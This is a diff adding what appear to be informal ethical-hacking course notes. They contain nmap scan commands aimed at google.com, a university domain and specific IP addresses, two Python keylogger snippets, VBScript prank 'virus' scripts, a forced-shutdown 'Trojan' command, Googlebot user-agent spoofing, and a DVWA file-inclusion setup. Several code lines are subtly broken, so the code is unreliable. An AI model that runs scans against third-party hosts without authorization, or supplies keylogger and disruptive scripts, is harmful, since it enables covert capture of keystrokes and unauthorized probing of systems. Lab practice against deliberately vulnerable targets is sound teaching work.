@@ -1,0 +1,105 @@
+Websites :
+--> whois (http://whois.domaintools.com)
+--> web.archieve.org -> wayback machine
+--> https://www.techpanda.org/index.php
+--> https://www.md5hashgenerator.com/
+--> https://crackstation.net/
+--> http://testphp.vulnweb.com/login.php
+------------------------------------------------------------------
+Scanning :
+	      nmap www.google.com
+	      nmap -open www.google.com
+single port : nmap -p 80 nmitd.edu.in
+range 	    : nmap -p 1-200 www.google.com / 103.108.220.91
+top 100     : nmap -F www.google.com
+ping scan   : nmap -sP www.google.com
+host scan   : nmap -sn www.google.com / 192.168.52.182/24
+DNS query   : nmap -sL 192.168.52.182/24
+UDP scan    : nmap -sU www.google.com
+OS scan     : nmap -O 192.168.54.147
+protocol    : nmap -sO www.google.com
+Version     : nmap -sV 103.108.220.51
+
+	    : ipconfig, ping, tracert, netstat
+
+------------------------------------------------------------------
+Keylogger : 
+
+import keyboard as kb
+rec = kb.record(until="escape")
+seq = kb.get_typed_strings(rec)
+print("",join(seq))
+
+	OR
+
+from pynput.keyboard import Key,Listener
+import logging
+logdir = "C:/Key/" logging.basicConfig(filename = (logdir + "KeyloggerDemo.txt"),level = logging.DEBUG, format = '%(acstime)s: %(message)s')
+def on_press(key):
+        logging.info(str(key))
+with Listener (on_press = on_press) as 
+Listener:
+Listener.join() 
+
+-----------------------------------------------------------------
+Virus : save as .vbs
+
+set x = wscript.CreateObject("wscript.shell")
+	Dim a : a = 50
+	For i = to a step 1
+	wscript.sleep 50
+	MsgBox("This is suspicious")
+next
+	MsgBox("Dang !!! You just clicked me 50 times.")
+wscript.Quit
+
+	OR
+
+set x = wscript.CreateObject("wscript.shell")
+	Dim a : a = 50
+	For i = to a step 1
+	wscript.sleep 50
+	x.sendkeys"{CAPSLOCK}"
+next
+wscript.Quit
+
+--------------------------------------------------------------
+Trojan : 
+shutdown /s/f/t 15/c "You clicked a Trojan"
+--------------------------------------------------------------
+Google bot : 
+
+	www.whatsmybrowser.com
+	https://useragentstring.com/Googlebot2.1_id_71.php
+	about:config
+	Googlebot/2.1 (+http://www.google.com/bot.html)
+general.useragent.override -> click string -> type googlebot string
+
+--------------------------------------------------------------
+
+DVWA : 
+	
+	xampp -> php -> php.ini -> allow_url_include = on
+File Inclusion : 
+	create a folder with two txt files 
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
